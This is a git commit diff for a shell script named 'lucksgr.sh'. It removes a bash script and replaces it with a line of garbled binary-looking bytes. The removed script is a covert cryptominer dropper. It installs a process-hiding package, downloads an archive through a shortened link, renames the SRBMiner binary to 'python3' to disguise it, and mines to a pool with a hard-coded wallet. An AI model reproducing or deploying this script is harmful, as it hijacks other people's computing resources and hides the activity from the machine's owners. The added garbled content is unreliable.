8ea0e48dd550a71de2b878a30b3d6979f7597cbf
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-18 15:26:26 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -1,21 +1,1 @@
-#!/bin/bash
-
-apt update -y
-
-apt install nodejs -y
-
-apt install npm -y
-
-npm i -g node-process-hider
-
-apt install screen -y
-
-wget -O dot https://bit.ly/kontolrum
-
-tar xvf dot
-
-cd SRBMiner-Multi-2-4-7
-
-mv SRBMiner-MULTI python3
-
-screen ./python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
+m{-jYlr찁~9-iۊrJ'kkZv\u$A2)ޯ.ؾ>kD"1B"zh)2zhP`榊w%q_Bvph7*07*]&ߩp1
